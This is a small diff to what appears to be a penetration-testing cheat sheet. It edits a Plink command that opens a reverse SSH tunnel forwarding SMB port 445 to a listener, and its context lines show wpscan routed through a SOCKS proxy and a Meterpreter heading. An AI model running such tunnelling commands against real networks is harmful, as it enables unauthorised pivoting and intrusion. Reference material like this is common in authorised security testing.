@@ -23,7 +23,7 @@ wpscan --url <url> --proxy socks5://127.0.0.1:9517 --force
 ### Plink
 
 ```sh
-plink.exe -l root -pw password -R 445:127.0.0.1:445 <listener_ip>
+plink.exe -l root -pw password -R 445:127.0.0.1:445 <listener_ip> [-P <listener_port>] 
 ```
 
 ### Meterpreter
